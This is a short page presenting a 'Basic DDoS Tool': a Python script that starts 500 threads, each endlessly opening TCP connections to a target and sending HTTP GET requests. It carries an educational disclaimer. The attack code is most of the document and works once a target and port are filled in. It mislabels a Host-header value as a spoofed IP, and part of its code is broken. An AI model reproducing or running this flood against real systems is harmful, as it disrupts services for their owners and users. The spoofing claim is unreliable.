 Basic DDoS Tool

DISCLAIMER: This is strictly an educational resource. Unauthorized use of this code against any network or system is illegal and unethical. Use only on systems you own or have explicit permission to test.

 Overview
This Python script demonstrates a basic Denial-of-Service (DoS) attack technique using:
- TCP socket connections
- Multi-threading (500 concurrent threads)
- HTTP request flooding

Purpose: To help cybersecurity students understand how simple DoS attacks work at a technical level and to study defensive countermeasures.

Technical Details
python
import threading
import socket

Configuration
target = ''   # TARGET IP (USE ONLY YOUR OWN SYSTEMS)
port =                 # HTTP port
fake_ip = '' # Spoofed IP header

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        # Sends spoofed HTTP request
        s.send(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode('ascii'))
        s.close()

Launch attack threads
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
